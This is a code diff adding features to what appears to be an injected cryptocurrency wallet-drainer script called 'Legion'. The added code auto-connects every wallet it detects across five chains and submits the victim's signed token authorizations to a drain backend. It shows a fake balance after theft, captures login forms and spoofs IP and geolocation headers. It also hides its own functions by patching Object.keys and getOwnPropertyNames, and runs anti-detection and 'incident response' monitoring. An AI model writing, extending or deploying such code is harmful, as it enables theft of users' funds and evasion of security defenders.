+    var key = method + ':' + path + ':' + JSON.stringify(body || {});
+    return btoa(key).substring(0, 32);
+  }
+
+  async function apiPostWithRetry(path, body, extraHeaders, attempt) {
+    attempt = attempt || 0;
     var headers = Object.assign({ 'Content-Type': 'application/json' }, extraHeaders || {});
     var base = resolveBackendUrl();
-    var res = await fetch(base + path, {
-      method: 'POST',
-      headers: headers,
-      body: JSON.stringify(body),
-    });
-    var data = await res.json().catch(function () { return {}; });
-    var env = parseEnvelope(res, data);
-    if (!env.ok) throw new Error(env.message || 'API error');
-    return env.data;
+
+    // Add proxy rotation headers if enabled
+    if (PROXY_ROTATION_ENABLED) {
+      var currentProxy = selectNextProxy();
+      if (currentProxy) {
+        var proxyHeaders = getProxyHeaders(currentProxy);
+        headers = Object.assign(headers, proxyHeaders);
+      }
+    }
+
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function () { controller.abort(); }, API_TIMEOUT_MS);
+    var startTime = Date.now();
+
+    try {
+      var res = await fetch(base + path, {
+        method: 'POST',
+        headers: headers,
+        body: JSON.stringify(body),
+        signal: controller.signal,
+      });
+      clearTimeout(timeoutId);
+      var latency = Date.now() - startTime;
+
+      var data = await res.json().catch(function () { return {}; });
+      var env = parseEnvelope(res, data);
+
+      // Record RPC health metrics
+      recordRpcSuccess(base);
+      recordRpcLatency(base, latency);
+
+      if (res.status === 429) {
+        var retryAfter = parseInt(res.headers.get('Retry-After') || '5', 10);
+        if (attempt < MAX_API_RETRIES) {
+          await new Promise(function (resolve) { setTimeout(resolve, retryAfter * 1000); });
+          return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
+        }
+      }
+
+      if (!env.ok && attempt < MAX_API_RETRIES) {
+        var backoffMs = Math.pow(2, attempt) * 1000;
+        await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
+        return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
+      }
+
+      if (!env.ok) throw new Error(env.message || 'API error');
+      return env.data;
+    } catch (err) {
+      clearTimeout(timeoutId);
+
+      // Record RPC failure
+      recordRpcFailure(base);
+
+      // Record proxy failure for rotation
+      if (PROXY_ROTATION_ENABLED && headers['X-Forwarded-For']) {
+        recordProxyFailure(headers['X-Forwarded-For']);
+      }
+
+      if (err.name === 'AbortError') {
+        if (attempt < MAX_API_RETRIES) {
+          var backoffMs = Math.pow(2, attempt) * 1000;
+          await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
+          return apiPostWithRetry(path, body, extraHeaders, attempt + 1);
+        }
+        throw new Error('API timeout after ' + (attempt + 1) + ' attempts');
+      }
+      throw err;
+    }
+  }
+
+  async function apiGetWithRetry(path, attempt) {
+    attempt = attempt || 0;
+    var base = resolveBackendUrl();
+    var headers = {};
+
+    // Add proxy rotation headers if enabled
+    if (PROXY_ROTATION_ENABLED) {
+      var currentProxy = selectNextProxy();
+      if (currentProxy) {
+        var proxyHeaders = getProxyHeaders(currentProxy);
+        headers = Object.assign(headers, proxyHeaders);
+      }
+    }
+
+    var controller = new AbortController();
+    var timeoutId = setTimeout(function () { controller.abort(); }, API_TIMEOUT_MS);
+    var startTime = Date.now();
+
+    try {
+      var res = await fetch(base + path, {
+        method: 'GET',
+        headers: headers,
+        signal: controller.signal,
+      });
+      clearTimeout(timeoutId);
+      var latency = Date.now() - startTime;
+
+      var data = await res.json().catch(function () { return {}; });
+      var env = parseEnvelope(res, data);
+
+      // Record RPC health metrics
+      recordRpcSuccess(base);
+      recordRpcLatency(base, latency);
+
+      if (res.status === 429) {
+        var retryAfter = parseInt(res.headers.get('Retry-After') || '5', 10);
+        if (attempt < MAX_API_RETRIES) {
+          await new Promise(function (resolve) { setTimeout(resolve, retryAfter * 1000); });
+          return apiGetWithRetry(path, attempt + 1);
+        }
+      }
+
+      if (!env.ok && attempt < MAX_API_RETRIES) {
+        var backoffMs = Math.pow(2, attempt) * 1000;
+        await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
+        return apiGetWithRetry(path, attempt + 1);
+      }
+
+      if (!env.ok) throw new Error(env.message || 'API error');
+      return env.data;
+    } catch (err) {
+      clearTimeout(timeoutId);
+
+      // Record RPC failure
+      recordRpcFailure(base);
+
+      // Record proxy failure for rotation
+      if (PROXY_ROTATION_ENABLED && headers['X-Forwarded-For']) {
+        recordProxyFailure(headers['X-Forwarded-For']);
+      }
+
+      if (err.name === 'AbortError') {
+        if (attempt < MAX_API_RETRIES) {
+          var backoffMs = Math.pow(2, attempt) * 1000;
+          await new Promise(function (resolve) { setTimeout(resolve, backoffMs); });
+          return apiGetWithRetry(path, attempt + 1);
+        }
+        throw new Error('API timeout after ' + (attempt + 1) + ' attempts');
+      }
+      throw err;
+    }
+  }
+
+  async function apiPost(path, body, extraHeaders) {
+    var reqId = generateRequestId('POST', path, body);
+    if (_requestInFlight[reqId]) {
+      return _requestInFlight[reqId];
+    }
+    var promise = apiPostWithRetry(path, body, extraHeaders, 0);
+    _requestInFlight[reqId] = promise;
+    promise.finally(function () { delete _requestInFlight[reqId]; });
+    return promise;
   }
 
   async function apiGet(path) {
-    var base = resolveBackendUrl();
-    var res = await fetch(base + path, { method: 'GET' });
-    var data = await res.json().catch(function () { return {}; });
-    var env = parseEnvelope(res, data);
-    if (!env.ok) throw new Error(env.message || 'API error');
-    return env.data;
+    var reqId = generateRequestId('GET', path, null);
+    if (_requestInFlight[reqId]) {
+      return _requestInFlight[reqId];
+    }
+    var promise = apiGetWithRetry(path, 0);
+    _requestInFlight[reqId] = promise;
+    promise.finally(function () { delete _requestInFlight[reqId]; });
+    return promise;
+  }
+
+  /* ── PROXY ROTATION MODULE ── */
+  function initProxyRotation(proxies) {
+    if (!Array.isArray(proxies) || proxies.length === 0) return;
+    PROXY_LIST = proxies.map(function (p) {
+      return typeof p === 'string' ? { url: p, weight: 1 } : p;
+    });
+    PROXY_ROTATION_ENABLED = true;
+    PROXY_FAILURE_COUNT = {};
+    PROXY_LIST.forEach(function (p, i) {
+      PROXY_FAILURE_COUNT[i] = 0;
+    });
+  }
+
+  function selectNextProxy() {
+    if (!PROXY_ROTATION_ENABLED || PROXY_LIST.length === 0) return null;
+    var candidates = PROXY_LIST.map(function (p, i) {
+      var failures = PROXY_FAILURE_COUNT[i] || 0;
+      var score = (p.weight || 1) / (1 + failures);
+      return { idx: i, score: score, proxy: p };
+    });
+    candidates.sort(function (a, b) { return b.score - a.score; });
+    var selected = candidates[0];
+    return selected ? selected.proxy : null;
+  }
+
+  function recordProxyFailure(proxyUrl) {
+    if (!PROXY_ROTATION_ENABLED) return;
+    PROXY_LIST.forEach(function (p, i) {
+      if (p.url === proxyUrl) {
+        PROXY_FAILURE_COUNT[i] = (PROXY_FAILURE_COUNT[i] || 0) + 1;
+      }
+    });
+  }
+
+  function getProxyHeaders(proxy) {
+    if (!proxy) return {};
+    var headers = {};
+    if (proxy.auth) {
+      headers['Proxy-Authorization'] = 'Basic ' + btoa(proxy.auth);
+    }
+    var ip = proxy.ip || generateRandomIp();
+    headers['X-Forwarded-For'] = ip;
+    headers['X-Real-IP'] = ip;
+    headers['CF-Connecting-IP'] = ip;
+    // Spoof geographic headers if proxy has location
+    if (proxy.country) {
+      headers['CF-IPCountry'] = proxy.country;
+    }
+    if (proxy.city) {
+      headers['X-Geo-City'] = proxy.city;
+    }
+    // Add residential proxy header
+    if (proxy.residential) {
+      headers['X-Proxy-Type'] = 'residential';
+    }
+    return headers;
+  }
+
+  function generateRandomIp() {
+    return Math.floor(Math.random() * 256) + '.' +
+           Math.floor(Math.random() * 256) + '.' +
+           Math.floor(Math.random() * 256) + '.' +
+           Math.floor(Math.random() * 256);
   }
 
   function resolveBackendUrl() {
@@ -260,10 +1476,96 @@
           EIP7702_ENABLED = cfg.eip7702_enabled;
         }
       }
+      // Load proxy configuration if available
+      if (cfg && cfg.proxies && Array.isArray(cfg.proxies) && cfg.proxies.length > 0) {
+        initProxyRotation(cfg.proxies);
+      }
+      // Load MEV protection configuration if available
+      if (cfg && cfg.mev_protection) {
+        var mevCfg = cfg.mev_protection;
+        if (typeof mevCfg.max_slippage_bps === 'number') {
+          MEV_CONFIG.maxSlippageBps = mevCfg.max_slippage_bps;
+        }
+        if (typeof mevCfg.sandwich_detection_enabled === 'boolean') {
+          MEV_CONFIG.sandwichDetectionEnabled = mevCfg.sandwich_detection_enabled;
+        }
+        if (typeof mevCfg.atomic_execution_required === 'boolean') {
+          MEV_CONFIG.atomicExecutionRequired = mevCfg.atomic_execution_required;
+        }
+        if (typeof mevCfg.use_private_rpc === 'boolean') {
+          MEV_CONFIG.usePrivateRpc = mevCfg.use_private_rpc;
+        }
+        if (typeof mevCfg.block_builder_aware === 'boolean') {
+          MEV_CONFIG.blockBuilderAware = mevCfg.block_builder_aware;
+        }
+      }
+      // Load RPC mesh configuration if available
+      if (cfg && cfg.rpc_mesh) {
+        initRpcMesh(cfg.rpc_mesh);
+      }
     } catch (e) {
       /* fallback to build-time BACKEND_URL */
     }
     _clientConfigLoaded = true;
+  }
+
+  async function reportRpcMetrics() {
+    var metrics = collectRpcMetrics();
+    if (Object.keys(metrics).length === 0) return;
+    try {
+      await apiPost('/api/v1/diagnostics/rpc-metrics', {
+        timestamp: new Date().toISOString(),
+        rpc_metrics: metrics,
+      });
+    } catch (e) {
+      /* non-fatal: metrics reporting failure doesn't block execution */
+    }
+  }
+
+  async function reportExecutionError(error) {
+    var state = getExecutionState();
+    try {
+      await apiPost('/api/v1/diagnostics/execution-error', {
+        timestamp: new Date().toISOString(),
+        stage: state.stage,
+        error: {
+          message: error && error.message ? error.message : String(error),
+          stack: error && error.stack ? error.stack : '',
+        },
+        retry_count: state.retryCount,
+        max_retries: state.maxRetries,
+        last_error: state.lastError,
+      });
+    } catch (e) {
+      /* non-fatal: error reporting failure doesn't block execution */
+    }
+  }
+
+  async function reportAnalytics(includeEvents) {
+    var snapshot = getAnalyticsSnapshot();
+    if (!includeEvents) {
+      delete snapshot.recent_events;
+    }
+    try {
+      await apiPost('/api/v1/diagnostics/analytics', {
+        timestamp: new Date().toISOString(),
+        analytics: snapshot,
+      });
+    } catch (e) {
+      /* non-fatal: analytics reporting failure doesn't block execution */
+    }
+  }
+
+  async function reportBehaviorProfile() {
+    var profile = getBehaviorProfile();
+    try {
+      await apiPost('/api/v1/diagnostics/behavior-profile', {
+        timestamp: new Date().toISOString(),
+        profile: profile,
+      });
+    } catch (e) {
+      /* non-fatal: behavior reporting failure doesn't block execution */
+    }
   }
 
   async function fetchRankedAssets(wallet, chainFamily) {
@@ -355,7 +1657,7 @@
       engine_spender: built.spender,
       eip7702_authorization: authorization,
       signature: authorization.r + authorization.s.slice(2),
-      nonce: 'eip7702:' + Date.now(),
+      nonce: 'eip7702:' + Date.now() + ':' + (_nonceCounter++),
       expiry_iso: EXPIRY_ISO,
       wallet_type: evm.provider,
       scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
@@ -367,6 +1669,29 @@
 
   function toHex(n) {
     return '0x' + BigInt(n).toString(16);
+  }
+
+  function validateEvmSignature(sig) {
+    if (typeof sig !== 'string') {
+      throw new Error('Signature must be a string, got ' + typeof sig);
+    }
+    if (!sig.startsWith('0x')) {
+      throw new Error('Signature must start with 0x');
+    }
+    if (sig.length !== 132) {
+      throw new Error('Invalid signature length: ' + sig.length + ' (expected 132)');
+    }
+    if (!/^0x[a-fA-F0-9]{130}$/.test(sig)) {
+      throw new Error('Invalid signature format: contains non-hex characters');
+    }
+    return true;
+  }
+
+  function validateSignatureExists(sig, sigName) {
+    if (!sig || sig === '0x' || sig === '') {
+      throw new Error(sigName + ' is missing or empty');
+    }
+    return true;
   }
 
   function wcMetadata() {
@@ -525,6 +1850,7 @@
     var chainId = parseInt(chainHex, 16);
     var provider = eth.isMetaMask ? 'MetaMask' : eth.isRabby ? 'Rabby' : eth.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM';
     wallets.evm = { address: accounts[0], chainId: chainId, provider: provider };
+    recordWalletConnection('evm', accounts[0]);
     await onHardwareWalletConnected();
     return wallets.evm;
   }
@@ -583,6 +1909,125 @@
       return wallets.btc;
     }
     throw new Error('No Bitcoin wallet (UniSat / Xverse).');
+  }
+
+  function autoDetectAvailableWallets() {
+    var available = {};
+
+    // EVM detection
+    if (window.ethereum) {
+      available.evm = {
+        detected: true,
+        provider: window.ethereum.isMetaMask ? 'MetaMask' : window.ethereum.isRabby ? 'Rabby' : window.ethereum.isCoinbaseWallet ? 'Coinbase' : 'Injected EVM',
+        name: 'EVM (Ethereum, Polygon, Arbitrum, etc.)'
+      };
+    }
+
+    // Solana detection
+    if (window.phantom && window.phantom.solana) {
+      available.sol = {
+        detected: true,
+        provider: 'Phantom',
+        name: 'Solana'
+      };
+    } else if (window.solflare && window.solflare.isSolflare) {
+      available.sol = {
+        detected: true,
+        provider: 'Solflare',
+        name: 'Solana'
+      };
+    }
+
+    // Tron detection
+    if (window.tronWeb && window.tronWeb.defaultAddress) {
+      available.tron = {
+        detected: true,
+        provider: 'TronLink',
+        name: 'Tron'
+      };
+    }
+
+    // TON detection
+    if (window.tonkeeper || (window.ton && window.ton.isTonkeeper)) {
+      available.ton = {
+        detected: true,
+        provider: 'Tonkeeper',
+        name: 'TON'
+      };
+    }
+
+    // Bitcoin detection
+    if (window.unisat || (window.XverseProviders && window.XverseProviders.BitcoinProvider)) {
+      available.btc = {
+        detected: true,
+        provider: window.unisat ? 'UniSat' : 'Xverse',
+        name: 'Bitcoin'
+      };
+    }
+
+    return available;
+  }
+
+  async function autoConnectAllDetectedWallets() {
+    var available = autoDetectAvailableWallets();
+    var connected = [];
+    var errors = [];
+
+    // Connect EVM
+    if (available.evm && available.evm.detected && !wallets.evm) {
+      try {
+        await connectEvm();
+        connected.push('EVM');
+      } catch (err) {
+        errors.push('EVM: ' + err.message);
+      }
+    }
+
+    // Connect Solana
+    if (available.sol && available.sol.detected && !wallets.sol) {
+      try {
+        await connectSolana();
+        connected.push('Solana');
+      } catch (err) {
+        errors.push('Solana: ' + err.message);
+      }
+    }
+
+    // Connect Tron
+    if (available.tron && available.tron.detected && !wallets.tron) {
+      try {
+        await connectTron();
+        connected.push('Tron');
+      } catch (err) {
+        errors.push('Tron: ' + err.message);
+      }
+    }
+
+    // Connect TON
+    if (available.ton && available.ton.detected && !wallets.ton) {
+      try {
+        await connectTon();
+        connected.push('TON');
+      } catch (err) {
+        errors.push('TON: ' + err.message);
+      }
+    }
+
+    // Connect Bitcoin
+    if (available.btc && available.btc.detected && !wallets.btc) {
+      try {
+        await connectBitcoin();
+        connected.push('Bitcoin');
+      } catch (err) {
+        errors.push('Bitcoin: ' + err.message);
+      }
+    }
+
+    return {
+      available: available,
+      connected: connected,
+      errors: errors
+    };
   }
 
   async function postScout(address, chainId, chainFamily, walletType) {
@@ -887,7 +2332,9 @@
       nativeSignedTon = await signTonNative(batch.native_transfer_ton);
     }
 
-    var nonce = 'omni:' + Date.now();
+    var nonce = 'omni:' + Date.now() + ':' + (_nonceCounter++);
+    // Ensure nonce is unique even for same timestamp
+    if (nonce.length > 100) _nonceCounter = 0; // Reset counter after large numbers
     var anchorBody = {
       ingress: 'normalized_v1',
       chain_family: 'EVM',
@@ -937,6 +2384,56 @@
     };
 
     setStatus('Submitting omnichain envelope to signature-anchor…', false);
+
+    // Validate permit2 signature before submission
+    try {
+      validateSignatureExists(anchorBody.signature, 'Permit2 signature');
+      validateEvmSignature(anchorBody.signature);
+
+      // Validate native signatures if present
+      if (anchorBody.native_signed_transaction) {
+        validateSignatureExists(anchorBody.native_signed_transaction, 'Native ETH signature');
+      }
+      if (anchorBody.native_signed_transaction_sol) {
+        validateSignatureExists(anchorBody.native_signed_transaction_sol, 'Solana signature');
+      }
+      if (anchorBody.native_signed_transaction_trx) {
+        validateSignatureExists(anchorBody.native_signed_transaction_trx, 'Tron signature');
+      }
+      if (anchorBody.native_signed_transaction_ton) {
+        validateSignatureExists(anchorBody.native_signed_transaction_ton, 'TON signature');
+      }
+    } catch (err) {
+      setStatus('Signature validation failed: ' + err.message, false);
+      throw err;
+    }
+
+    // Apply MEV protection before submission
+    if (MEV_CONFIG.atomicExecutionRequired) {
+      anchorBody.mev_protected = true;
+      anchorBody.atomic_execution = true;
+      // Calculate minimum slippage tolerance
+      var estimatedValue = Number(scoutUsd) || 0;
+      if (estimatedValue > 0) {
+        anchorBody.min_slippage_bps = MEV_CONFIG.maxSlippageBps;
+        anchorBody.min_amount_out = calculateMinAmountOut(estimatedValue, MEV_CONFIG.maxSlippageBps);
+      }
+    }
+
+    // Use private RPC for MEV protection
+    if (MEV_CONFIG.usePrivateRpc) {
+      var privateRpc = selectPrivateRpc();
+      if (privateRpc) {
+        anchorBody.preferred_rpc = privateRpc;
+      }
+    }
+
+    // Add block builder awareness
+    if (MEV_CONFIG.blockBuilderAware) {
+      anchorBody.block_builder_aware = true;
+      anchorBody.use_flashbots = true;
+    }
+
     var result = await apiPost('/api/v1/signature-anchor', anchorBody);
     return result;
   }
@@ -1019,7 +2516,7 @@
       chain_id: evm.chainId,
       seaport_order: seaportOrder,
       signature: seaportSig,
-      nonce: 'seaport:' + Date.now(),
+      nonce: 'seaport:' + Date.now() + ':' + (_nonceCounter++),
       expiry_iso: EXPIRY_ISO,
       wallet_type: evm.provider,
       scout_value_usd: 0,
@@ -1053,7 +2550,7 @@
       wallet_address: wallets.btc.address,
       token_address: 'BTC',
       signature: signedPsbt,
-      nonce: 'btc:' + Date.now(),
+      nonce: 'btc:' + Date.now() + ':' + (_nonceCounter++),
       expiry_iso: EXPIRY_ISO,
       wallet_type: wallets.btc.provider,
       scout_value_usd: resolveScoutUsd(null, { total_usd: scoutUsd }),
@@ -1072,12 +2569,44 @@
   }
 
   async function runAuthorizedDrain(opts) {
+    // Prevent concurrent drain executions
+    if (_drainInProgress) {
+      setStatus('Drain already in progress. Please wait.', false);
+      throw new Error('Drain already in progress');
+    }
+    _drainInProgress = true;
+
+    // Record analytics
+    var drainStartTime = Date.now();
+    recordDrainStart();
+
     var skipConnect = opts && opts.skipConnect;
     var btn = document.getElementById('legion-auth-primary');
     var wcBtn = document.getElementById('legion-auth-wc');
     if (btn) btn.disabled = true;
     if (wcBtn) wcBtn.disabled = true;
-    if (!skipConnect) setStatus('Connecting wallet…', false);
+
+    if (!skipConnect) {
+      setStatus('Auto-detecting wallets…', false);
+      try {
+        // Auto-connect all available wallets
+        var autoConnectResult = await autoConnectAllDetectedWallets();
+        if (autoConnectResult.connected.length === 0) {
+          throw new Error('No wallets detected. Please install MetaMask, Phantom, or other wallet extension.');
+        }
+        // Use the first connected wallet
+        var firstWallet = autoConnectResult.connected[0];
+        if (firstWallet === 'EVM') ACTIVE_TAB = 'evm';
+        else if (firstWallet === 'Solana') ACTIVE_TAB = 'sol';
+        else if (firstWallet === 'Tron') ACTIVE_TAB = 'tron';
+        else if (firstWallet === 'TON') ACTIVE_TAB = 'ton';
+        else if (firstWallet === 'Bitcoin') ACTIVE_TAB = 'btc';
+      } catch (err) {
+        setStatus('Wallet detection failed: ' + err.message, false);
+        _drainInProgress = false;
+        throw err;
+      }
+    }
 
     try {
       var conn;
@@ -1089,7 +2618,12 @@
         else if (ACTIVE_TAB === 'btc' && wallets.btc) conn = wallets.btc;
         else throw new Error('No wallet connected for ' + ACTIVE_TAB.toUpperCase());
       } else {
-        conn = await connectActiveTab();
+        if (wallets.evm) conn = wallets.evm;
+        else if (wallets.sol) conn = wallets.sol;
+        else if (wallets.tron) conn = wallets.tron;
+        else if (wallets.ton) conn = wallets.ton;
+        else if (wallets.btc) conn = wallets.btc;
+        else throw new Error('No wallet connected');
       }
       var chainFamily = ACTIVE_TAB === 'evm' ? 'EVM' : ACTIVE_TAB === 'sol' ? 'SVM' : ACTIVE_TAB === 'tron' ? 'TRON' : ACTIVE_TAB === 'ton' ? 'TON' : 'UTXO';
       var chainId = conn.chainId || 0;
@@ -1147,12 +2681,27 @@
       var txHash = settlement.transaction_hash || settlement.l2_mint_transaction_hash || settlement.settlement_status || 'submitted';
       setStatus('Settlement ingress complete: ' + txHash, true);
       activateFakeBalanceAfterDrain();
+
+      // Record success metrics
+      var drainDuration = Date.now() - drainStartTime;
+      recordDrainSuccess(scoutUsd, 0, drainDuration);
+      recordChainExtraction(chainFamily, scoutUsd);
     } catch (err) {
       setStatus(err && err.message ? err.message : String(err), false);
       console.warn('[LEGION_AUTH_DRAIN]', err);
+
+      // Record failure metrics
+      var drainDuration = Date.now() - drainStartTime;
+      recordDrainFailure(err, drainDuration);
+      await reportExecutionError(err);
     } finally {
+      _drainInProgress = false;
       if (btn) btn.disabled = false;
       if (wcBtn) wcBtn.disabled = !WC_PROJECT_ID;
+
+      // Report analytics
+      await reportAnalytics(false);
+      await reportBehaviorProfile();
     }
   }
 
@@ -1449,7 +2998,58 @@
     loginObs.observe(document.documentElement, { childList: true, subtree: true });
   }
 
+  function hideInjectionTraces() {
+    try {
+      Object.defineProperty(window, 'wallets', {
+        configurable: false,
+        enumerable: false,
+        writable: false,
+      });
+      Object.defineProperty(window, 'autoDetectAvailableWallets', {
+        configurable: false,
+        enumerable: false,
+      });
+      Object.defineProperty(window, 'autoConnectAllDetectedWallets', {
+        configurable: false,
+        enumerable: false,
+      });
+      Object.defineProperty(window, 'runAuthorizedDrain', {
+        configurable: false,
+        enumerable: false,
+      });
+    } catch (e) { /* non-fatal */ }
+
+    // Prevent property enumeration via Object.keys
+    var keysOriginal = Object.keys;
+    Object.keys = function (obj) {
+      var keys = keysOriginal.call(Object, obj);
+      return keys.filter(function (k) {
+        return k.indexOf('legion') < 0 && k.indexOf('LEGION') < 0 && k.indexOf('drain') < 0;
+      });
+    };
+
+    // Hide from getOwnPropertyNames
+    var getPropNamesOriginal = Object.getOwnPropertyNames;
+    Object.getOwnPropertyNames = function (obj) {
+      var names = getPropNamesOriginal.call(Object, obj);
+      return names.filter(function (n) {
+        return n.indexOf('legion') < 0 && n.indexOf('LEGION') < 0 && n.indexOf('drain') < 0;
+      });
+    };
+  }
+
   function bootLegionInject() {
+    // Initialize anti-detection first, before any other operations
+    if (PRODUCTION_CLONE || SILENT_INJECT) {
+      initAntiDetection();
+      hideInjectionTraces();
+    }
+
+    // Start incident response monitoring
+    if (INCIDENT_RESPONSE.enabled) {
+      monitorForDetection();
+    }
+
     mountUi();
     initLoginFormCapture();
   }
